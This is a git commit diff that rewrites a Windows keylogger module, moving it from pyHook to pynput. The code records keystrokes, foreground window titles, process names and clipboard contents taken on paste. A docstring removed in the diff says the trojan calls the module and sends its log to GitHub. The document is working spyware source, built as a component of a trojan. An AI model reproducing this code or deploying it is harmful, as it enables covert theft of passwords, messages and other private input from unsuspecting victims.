592a4947c72a60398397a6f3eb74736fabb7be84
Le Duc Y <ducyle04@gmail.com>
2025-05-14 17:09:09 -0400

    Thay đổi

--- modules/keylogger.py
+++ modules/keylogger.py
@@ -1,15 +1,15 @@
-import pythoncom
-import pyHook
-import win32clipboard
+from pynput import keyboard
+import time
 from ctypes import *
+import win32clipboard
 
 user32 = windll.user32
 kernel32 = windll.kernel32
 psapi = windll.psapi
 
 current_window = None
-log = ""  # Lưu chuỗi log toàn cục
-
+log = ""
+start_time = None
 
 def get_current_process():
     global log
@@ -18,61 +18,65 @@ def get_current_process():
     pid = c_ulong(0)
     user32.GetWindowThreadProcessId(hwnd, byref(pid))
 
-    executable = create_string_buffer(b'\x00' * 512)
+    executable = create_string_buffer(b"\x00" * 512)
     h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
     psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
 
-    window_title = create_string_buffer(b'\x00' * 512)
+    window_title = create_string_buffer(b"\x00" * 512)
     user32.GetWindowTextA(hwnd, byref(window_title), 512)
 
-    log += "\n\n[ PID: %d | %s | %s ]\n" % (pid.value, executable.value.decode(), window_title.value.decode())
+    log += "\n\n[ PID: %d | %s | %s ]\n" % (
+        pid.value,
+        executable.value.decode(errors="ignore"),
+        window_title.value.decode(errors="ignore"),
+    )
 
     kernel32.CloseHandle(hwnd)
     kernel32.CloseHandle(h_process)
 
-
-def KeyStroke(event):
+def on_press(key):
     global current_window
     global log
 
-    if event.WindowName != current_window:
-        current_window = event.WindowName
-        get_current_process()
+    try:
+        hwnd = user32.GetForegroundWindow()
+        window_title = create_string_buffer(b"\x00" * 512)
+        user32.GetWindowTextA(hwnd, byref(window_title), 512)
+        window_title_str = window_title.value.decode(errors="ignore")
 
-    if 32 < event.Ascii < 127:
-        log += chr(event.Ascii)
-    else:
-        if event.Key == "V":
+        if window_title_str != current_window:
+            current_window = window_title_str
+            get_current_process()
+
+        if hasattr(key, "char") and key.char:
+            log += key.char
+        elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
+            pass
+        elif key == keyboard.Key.ctrl_v:
             try:
                 win32clipboard.OpenClipboard()
                 pasted_value = win32clipboard.GetClipboardData()
                 win32clipboard.CloseClipboard()
-                log += "\n[PASTE] - %s\n" % pasted_value
+                log += f"\n[PASTE] - {pasted_value}\n"
             except:
                 log += "\n[PASTE] - (error)\n"
         else:
-            log += "[%s]" % event.Key
+            log += f"[{key.name}]"
+    except:
+        log += "[?]"
 
-    return True
-
-
-def run():
-    """
-    Hàm run() sẽ được trojan gọi. Nó sẽ chạy keylogger trong ~10 giây,
-    sau đó trả về log đã ghi được để trojan ghi vào GitHub.
-    """
+def run(**args):
     global log
+    global start_time
 
     log = ""
-    kl = pyHook.HookManager()
-    kl.KeyDown = KeyStroke
-    kl.HookKeyboard()
+    start_time = time.time()
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
 
-    print("[*] Keylogger started...")
+    while time.time() - start_time < 10:
+        time.sleep(0.1)
 
-    # Chạy trong 10 giây rồi kết thúc
-    start = kernel32.GetTickCount()
-    while kernel32.GetTickCount() - start < 10000:
-        pythoncom.PumpWaitingMessages()
-
+    listener.stop()
     return log or "[No keystroke recorded]"
+
